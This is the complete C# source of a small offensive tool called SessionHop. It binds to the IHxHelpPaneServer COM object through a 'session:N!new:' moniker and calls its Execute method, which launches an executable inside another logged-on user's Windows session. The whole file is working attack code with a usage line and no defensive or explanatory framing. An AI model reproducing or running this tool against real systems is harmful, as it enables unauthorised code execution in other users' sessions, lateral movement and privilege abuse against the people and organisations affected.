using System;
using System.IO;
using System.Runtime.InteropServices;

namespace SessionHop
{
    class Program
    {
        [ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IHxHelpPaneServer
        {
            void DisplayTask(string task);
            void DisplayContents(string contents);
            void DisplaySearchResults(string search);
            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
        }

        static void Main(string[] args)
        {
            try
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("Usage: SessionHop.exe <session_id> <executable>");
                    return;
                }

                int new_session_id = int.Parse(args[0]);
                string executablePath = args[1];

                Console.WriteLine("Executing {0} in Session {1}", executablePath, new_session_id);

                IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
                Uri target = new Uri(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), executablePath));
                server.Execute(target.AbsoluteUri);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
